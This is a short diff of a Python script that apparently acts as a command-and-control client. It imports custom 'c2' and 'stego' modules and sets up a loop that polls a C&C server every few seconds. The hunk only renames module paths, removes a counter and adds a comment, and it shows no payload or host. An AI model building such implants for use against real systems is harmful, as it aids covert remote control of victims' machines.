@@ -23,13 +23,12 @@ print(appHeader)
 import time
 
 #Import custom modules
-import modules.c2 as c2Module
-import modules.stego as stegoModule
+import shared_modules.c2 as c2Module
+import shared_modules.stego as stegoModule
 
 #Initialize script variables
 waitingForC2 = True
-timeBeforeNextC2Poll = 5
-lastMessageCounter = 0
+timeBeforeNextC2Poll = 5 #Seconds
 
 #Creating an endless loop that contacts the C&C every n seconds
 firstLoopItteration = True
